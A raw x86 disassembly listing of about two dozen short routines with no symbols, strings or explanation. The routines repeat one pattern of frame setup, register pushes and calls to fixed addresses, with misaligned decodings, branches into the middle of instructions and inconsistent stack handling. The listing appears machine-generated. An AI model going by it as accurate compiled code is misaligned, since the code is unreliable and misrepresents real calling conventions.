  4d10e4:	lea    eax,[esi-0x10c]
  4d10ea:	add    DWORD PTR [eax+0x16c],ecx
  4d10f0:	push   eax
  4d10f1:	push   ebx
  4d10f2:	push   esi
  4d10f3:	push   DWORD PTR [eax+0x18]
  4d10f6:	call   0x4d1478
  4d10fb:	add    esp,0xc
  4d10fe:	pop    eax
  4d10ff:	push   eax
  4d1100:	push   0x0
  4d1102:	call   0x4d10c4
  4d1107:	add    esp,0x4
  4d110a:	pop    eax
  4d110b:	push   eax
  4d110c:	mov    edi,0x0
  4d1111:	push   edi
  4d1112:	call   0x4d10b8
  4d1117:	add    esp,0x4
  4d111a:	pop    eax
  4d111b:	add    esp,0x48
  4d111e:	pop    ebp
  4d111f:	ret    
  4d1120:	mov    edi,edi
  4d1122:	push   ebp
  4d1123:	mov    ebp,esp
  4d1125:	sub    esp,0x30
  4d1128:	lea    eax,ds:0x4d31a0
  4d112e:	or     DWORD PTR [ebp-0x1c],0xffffe151
  4d1135:	push   eax
  4d1136:	mov    esi,0x0
  4d113b:	push   esi
  4d113c:	call   0x4d0fbc
  4d1141:	add    esp,0x4
  4d1144:	pop    eax
  4d1145:	push   eax
  4d1146:	push   ecx
  4d1147:	push   DWORD PTR [eax+0x70]
  4d114a:	call   0x4d1064
  4d114f:	add    esp,0x8
  4d1152:	pop    eax
  4d1153:	push   eax
  4d1154:	push   0x0
  4d1156:	call   0x4d10b8
  4d115b:	add    esp,0x4
  4d115e:	pop    eax
  4d115f:	add    esp,0x30
  4d1162:	pop    ebp
  4d1163:	ret    
  4d1164:	pop    edi
  4d1165:	call   DWORD PTR ds:0x4d207c
  4d116b:	call   edi
  4d116d:	add    BYTE PTR [eax],al
  4d116f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1175:	sub    esp,0x60
  4d1178:	mov    eax,0x4d3054
  4d117d:	add    edx,0xffffffa1
  4d1180:	push   eax
  4d1181:	push   ecx
  4d1182:	push   DWORD PTR [eax+0x70]
  4d1185:	push   DWORD PTR [eax+0x174]
  4d118b:	push   DWORD PTR [eax+0x5c]
  4d118e:	call   0x4d0b78
  4d1193:	add    esp,0x10
  4d1196:	pop    eax
  4d1197:	push   eax
  4d1198:	mov    edi,0x0
  4d119d:	push   edi
  4d119e:	call   0x4d0ac0
  4d11a3:	add    esp,0x4
  4d11a6:	pop    eax
  4d11a7:	push   eax
  4d11a8:	mov    esi,0x0
  4d11ad:	push   esi
  4d11ae:	call   0x4d13c0
  4d11b3:	add    esp,0x4
  4d11b6:	pop    eax
  4d11b7:	add    esp,0x60
  4d11ba:	pop    ebp
  4d11bb:	ret    
  4d11bc:	mov    edi,edi
  4d11be:	push   ebp
  4d11bf:	mov    ebp,esp
  4d11c1:	sub    esp,0x5c
  4d11c4:	lea    esi,[edx+0xa0]
  4d11ca:	sub    edi,0xffffff8e
  4d11cd:	push   esi
  4d11ce:	push   edx
  4d11cf:	push   ebx
  4d11d0:	call   0x4d07d8
  4d11d5:	add    esp,0x8
  4d11d8:	pop    esi
  4d11d9:	lea    ecx,[esi-0x1fc]
  4d11df:	push   ecx
  4d11e0:	call   0x4d141c
  4d11e5:	add    esp,0x4
  4d11e8:	test   eax,eax
  4d11ea:	jne    0x4d11da
  4d11ec:	mov    edx,0x0
  4d11f1:	push   edx
  4d11f2:	call   0x4d0dec
  4d11f7:	add    esp,0x4
  4d11fa:	add    esp,0x5c
  4d11fd:	pop    ebp
  4d11fe:	ret    
  4d11ff:	add    BYTE PTR [edi-0x1],bl
  4d1202:	adc    eax,0x4d209c
  4d1207:	call   edi
  4d1209:	add    BYTE PTR [eax],al
  4d120b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1211:	sub    esp,0x40
  4d1214:	lea    esi,ds:0x4d3024
  4d121a:	sub    edx,esi
  4d121c:	push   esi
  4d121d:	push   DWORD PTR [esi+0xe0]
  4d1223:	push   edx
  4d1224:	push   DWORD PTR [esi+0x174]
  4d122a:	push   edx
  4d122b:	call   0x4d14bc
  4d1230:	add    esp,0x10
  4d1233:	pop    esi
  4d1234:	mov    ebx,0x0
  4d1239:	push   ebx
  4d123a:	call   0x4d0fbc
  4d123f:	add    esp,0x4
  4d1242:	push   0x0
  4d1244:	call   0x4d0fbc
  4d1249:	add    esp,0x4
  4d124c:	add    esp,0x40
  4d124f:	pop    ebp
  4d1250:	ret    
  4d1251:	add    BYTE PTR [eax],al
  4d1253:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1259:	sub    esp,0x48
  4d125c:	mov    ecx,0x4d3194
  4d1261:	mov    eax,DWORD PTR [ecx-0x194]
  4d1267:	push   ecx
  4d1268:	push   eax
  4d1269:	push   eax
  4d126a:	push   DWORD PTR [ecx+0xc4]
  4d1270:	push   esi
  4d1271:	call   0x4d0e3c
  4d1276:	add    esp,0x10
  4d1279:	pop    ecx
  4d127a:	push   ecx
  4d127b:	mov    edi,0x0
  4d1280:	push   edi
  4d1281:	call   0x4d13c0
  4d1286:	add    esp,0x4
  4d1289:	pop    ecx
  4d128a:	push   ecx
  4d128b:	push   0x0
  4d128d:	call   0x4d0acc
  4d1292:	add    esp,0x4
  4d1295:	pop    ecx
  4d1296:	add    esp,0x48
  4d1299:	pop    ebp
  4d129a:	ret    
  4d129b:	add    BYTE PTR [edi-0x1],bl
  4d129e:	adc    eax,0x4d208c
  4d12a3:	call   edi
  4d12a5:	add    BYTE PTR [eax],al
  4d12a7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d12ad:	sub    esp,0x20
  4d12b0:	mov    ecx,0x4d30c4
  4d12b5:	and    edi,ebx
  4d12b7:	push   ecx
  4d12b8:	push   0x0
  4d12ba:	call   0x4d0fbc
  4d12bf:	add    esp,0x4
  4d12c2:	pop    ecx
  4d12c3:	push   ecx
  4d12c4:	push   DWORD PTR [ecx+0x98]
  4d12ca:	push   DWORD PTR [ecx+0x134]
  4d12d0:	push   edi
  4d12d1:	call   0x4d0ce0
  4d12d6:	add    esp,0xc
  4d12d9:	pop    ecx
  4d12da:	push   ecx
  4d12db:	mov    ebx,0x0
  4d12e0:	push   ebx
  4d12e1:	call   0x4d0fbc
  4d12e6:	add    esp,0x4
  4d12e9:	pop    ecx
  4d12ea:	add    esp,0x20
  4d12ed:	pop    ebp
  4d12ee:	ret    
  4d12ef:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d12f5:	sub    esp,0x20
  4d12f8:	lea    ebx,ds:0x4d3004
  4d12fe:	add    DWORD PTR [ebx-0x4],0x25
  4d1302:	push   ebx
  4d1303:	push   edi
  4d1304:	push   DWORD PTR [ebx+0x148]
  4d130a:	push   esi
  4d130b:	call   0x4d0788
  4d1310:	add    esp,0xc
  4d1313:	pop    ebx
  4d1314:	call   0x4d0cc8
  4d1319:	add    esp,0x4
  4d131c:	push   0xfffffff4
  4d131e:	call   0x4d0d84
  4d1323:	add    esp,0x4
  4d1326:	add    esp,0x20
  4d1329:	pop    ebp
  4d132a:	ret    
  4d132b:	add    BYTE PTR [edi-0x1],bl
  4d132e:	adc    eax,0x4d2044
  4d1333:	call   edi
  4d1335:	add    BYTE PTR [eax],al
  4d1337:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d133d:	sub    esp,0x34
  4d1340:	lea    esi,ds:0x4d30fc
  4d1346:	or     DWORD PTR [ebp-0x28],edi
  4d1349:	push   esi
  4d134a:	push   DWORD PTR [esi+0x88]
  4d1350:	push   edi
  4d1351:	call   0x4d0f78
  4d1356:	add    esp,0x8
  4d1359:	pop    esi
  4d135a:	mov    edi,0xfffffff4
  4d135f:	push   edi
  4d1360:	call   0x4d0d84
  4d1365:	add    esp,0x4
  4d1368:	push   0x0
  4d136a:	call   0x4d0fbc
  4d136f:	add    esp,0x4
  4d1372:	add    esp,0x34
  4d1375:	pop    ebp
  4d1376:	ret    
  4d1377:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d137d:	sub    esp,0x34
  4d1380:	lea    ebx,ds:0x4d3084
  4d1386:	and    edi,eax
  4d1388:	push   0x0
  4d138a:	call   0x4d0ac0
  4d138f:	add    esp,0x4
  4d1392:	push   ebx
  4d1393:	push   eax
  4d1394:	push   DWORD PTR [ebx+0x198]
  4d139a:	call   0x4d1170
  4d139f:	add    esp,0x8
  4d13a2:	pop    ebx
  4d13a3:	push   0x0
  4d13a5:	call   0x4d0dec
  4d13aa:	add    esp,0x4
  4d13ad:	add    esp,0x34
  4d13b0:	pop    ebp
  4d13b1:	ret    
  4d13b2:	add    BYTE PTR [eax],al
  4d13b4:	pop    edi
  4d13b5:	call   DWORD PTR ds:0x4d2068
  4d13bb:	call   edi
  4d13bd:	add    BYTE PTR [eax],al
  4d13bf:	add    BYTE PTR [edi-0x1],bl
  4d13c2:	adc    eax,0x4d201c
  4d13c7:	call   edi
  4d13c9:	add    BYTE PTR [eax],al
  4d13cb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d13d1:	sub    esp,0x3c
  4d13d4:	mov    edx,0x4d315c
  4d13d9:	and    ebx,DWORD PTR [ebp-0x28]
  4d13dc:	push   edx
  4d13dd:	push   0x0
  4d13df:	call   0x4d13c0
  4d13e4:	add    esp,0x4
  4d13e7:	pop    edx
  4d13e8:	push   edx
  4d13e9:	push   DWORD PTR [edx+0x1e0]
  4d13ef:	push   DWORD PTR [edx+0x1ac]
  4d13f5:	push   esi
  4d13f6:	push   ebx
  4d13f7:	call   0x4d11bc
  4d13fc:	add    esp,0x10
  4d13ff:	pop    edx
  4d1400:	push   edx
  4d1401:	lea    eax,[edx-0x15c]
  4d1407:	push   eax
  4d1408:	call   0x4d141c
  4d140d:	add    esp,0x4
  4d1410:	test   eax,eax
  4d1412:	jne    0x4d1401
  4d1414:	pop    edx
  4d1415:	add    esp,0x3c
  4d1418:	pop    ebp
  4d1419:	ret    
  4d141a:	add    BYTE PTR [eax],al
  4d141c:	pop    edi
  4d141d:	call   DWORD PTR ds:0x4d202c
  4d1423:	call   edi
  4d1425:	add    BYTE PTR [eax],al
  4d1427:	add    BYTE PTR [edi-0x1],bl
  4d142a:	adc    eax,0x4d2040
  4d142f:	call   edi
  4d1431:	add    BYTE PTR [eax],al
  4d1433:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1439:	sub    esp,0x4c
  4d143c:	lea    eax,ds:0x4d318c
  4d1442:	and    edi,DWORD PTR [eax+0x1c]
  4d1445:	push   eax
  4d1446:	push   0x0
  4d1448:	call   0x4d0ac0
  4d144d:	add    esp,0x4
  4d1450:	pop    eax
  4d1451:	push   eax
  4d1452:	push   DWORD PTR [eax+0x54]
  4d1455:	push   DWORD PTR [eax+0x120]
  4d145b:	push   DWORD PTR [eax+0x34]
  4d145e:	call   0x4d0f24
  4d1463:	add    esp,0xc
  4d1466:	pop    eax
  4d1467:	push   eax
  4d1468:	push   0x0
  4d146a:	call   0x4d0ac0
  4d146f:	add    esp,0x4
  4d1472:	pop    eax
  4d1473:	add    esp,0x4c
  4d1476:	pop    ebp
  4d1477:	ret    
  4d1478:	mov    edi,edi
  4d147a:	push   ebp
  4d147b:	mov    ebp,esp
  4d147d:	sub    esp,0x44
  4d1480:	lea    edi,ds:0x4d3124
  4d1486:	sbb    DWORD PTR [ebp-0x44],0xb
  4d148a:	push   edi
  4d148b:	push   DWORD PTR [edi+0x178]
  4d1491:	push   DWORD PTR [edi+0x11c]
  4d1497:	call   0x4d12f0
  4d149c:	add    esp,0x8
  4d149f:	pop    edi
  4d14a0:	push   edi
  4d14a1:	call   0x4d0c68
  4d14a6:	add    esp,0x4
  4d14a9:	pop    edi
  4d14aa:	push   edi
  4d14ab:	push   0x0
  4d14ad:	call   0x4d1164
  4d14b2:	add    esp,0x4
  4d14b5:	pop    edi
  4d14b6:	add    esp,0x44
  4d14b9:	pop    ebp
  4d14ba:	ret    
  4d14bb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d14c1:	sub    esp,0x5c
  4d14c4:	lea    eax,[esi+0x1b8]
  4d14ca:	sbb    ecx,DWORD PTR [eax-0x1b0]
  4d14d0:	push   eax
  4d14d1:	push   edx
  4d14d2:	push   DWORD PTR [eax+0x1a4]
  4d14d8:	push   esi
  4d14d9:	call   0x4d0d3c
  4d14de:	add    esp,0xc
  4d14e1:	pop    eax
  4d14e2:	push   eax
  4d14e3:	push   0xfffffff4
  4d14e5:	call   0x4d0d84
  4d14ea:	add    esp,0x4
  4d14ed:	pop    eax
  4d14ee:	push   eax
  4d14ef:	mov    esi,0xfffffff4
  4d14f4:	push   esi
  4d14f5:	call   0x4d0d84
  4d14fa:	add    esp,0x4
  4d14fd:	pop    eax
  4d14fe:	add    esp,0x5c
  4d1501:	pop    ebp
  4d1502:	ret    
  4d1503:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1509:	sub    esp,0x1c
  4d150c:	lea    edx,[edi-0x18]
  4d150f:	cmp    edx,0x24a2
  4d1515:	jb     0x4d1507
  4d1517:	push   edx
  4d1518:	push   esi
  4d1519:	push   DWORD PTR [edx+0x180]
  4d151f:	push   DWORD PTR [edx+0x24]
  4d1522:	push   ecx
  4d1523:	call   0x4d0bc8
  4d1528:	add    esp,0x10
  4d152b:	pop    edx
  4d152c:	push   edx
  4d152d:	mov    esi,0x0
  4d1532:	push   esi
  4d1533:	call   0x4d0870
  4d1538:	add    esp,0x4
  4d153b:	pop    edx
  4d153c:	push   edx
  4d153d:	push   0x0
  4d153f:	call   0x4d0fbc
  4d1544:	add    esp,0x4
  4d1547:	pop    edx
  4d1548:	add    esp,0x1c
  4d154b:	pop    ebp
  4d154c:	ret    
  4d154d:	add    BYTE PTR [eax],al
  4d154f:	add    BYTE PTR [edi-0x1],bl
  4d1552:	adc    eax,0x4d2098
  4d1557:	call   edi
  4d1559:	add    BYTE PTR [eax],al
  4d155b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1561:	sub    esp,0x28
  4d1564:	lea    edx,[edi+0x4]
  4d1567:	xor    esi,DWORD PTR [edx+0x188]
  4d156d:	push   edx
  4d156e:	push   eax
  4d156f:	push   edi
  4d1570:	call   0x4d0d90
  4d1575:	add    esp,0x8
  4d1578:	pop    edx
  4d1579:	push   edx
  4d157a:	call   0x4d0cc8
  4d157f:	add    esp,0x4
  4d1582:	pop    edx
  4d1583:	push   edx
  4d1584:	push   0x0
  4d1586:	call   0x4d10c4
  4d158b:	add    esp,0x4
  4d158e:	pop    edx
  4d158f:	add    esp,0x28
  4d1592:	pop    ebp
  4d1593:	ret    
  4d1594:	mov    edi,edi
  4d1596:	push   ebp
  4d1597:	mov    ebp,esp
  4d1599:	sub    esp,0x24
  4d159c:	lea    ecx,ds:0x4d3138
  4d15a2:	mov    DWORD PTR [ebp-0x4],0x764d
  4d15a9:	push   ecx
  4d15aa:	push   esi
  4d15ab:	push   ebx
  4d15ac:	push   edx
  4d15ad:	call   0x4d08a0
  4d15b2:	add    esp,0xc
  4d15b5:	pop    ecx
  4d15b6:	push   ecx
  4d15b7:	push   0x0
  4d15b9:	call   0x4d13c0
  4d15be:	add    esp,0x4
  4d15c1:	pop    ecx
  4d15c2:	push   ecx
  4d15c3:	push   0x0
  4d15c5:	call   0x4d13c0
  4d15ca:	add    esp,0x4
  4d15cd:	pop    ecx
  4d15ce:	add    esp,0x24
  4d15d1:	pop    ebp
  4d15d2:	ret    
	...
